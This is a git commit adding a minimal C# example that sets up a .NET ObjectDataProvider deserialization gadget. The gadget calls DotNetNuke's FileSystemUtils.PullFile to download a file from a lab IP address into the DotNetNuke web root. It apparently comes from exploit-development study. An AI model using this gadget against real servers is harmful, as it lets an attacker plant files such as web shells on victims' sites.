94e4043c2460c0428148780e7132863f218a6637
Timothé Maammar <98331464+TimotheMaammar@users.noreply.github.com>
2024-02-11 13:36:57 +0100

    Exemple minimaliste d'utilisation de la classe ObjectDataProvider

---
+++ 6_Exemple_ObjectDataProvider.cs
@@ -0,0 +1,21 @@
+using System;
+using System.IO;
+using System.Xml.Serialization;
+using DotNetNuke.Common.Utilities;
+using System.Windows.Data;
+
+namespace ODPSerializer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            ObjectDataProvider myODP = new ObjectDataProvider();
+            myODP.ObjectInstance = new FileSystemUtils();
+            myODP.MethodName = "PullFile";
+            myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
+            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
+            Console.WriteLine("Done!");
+        }
+    }
+}
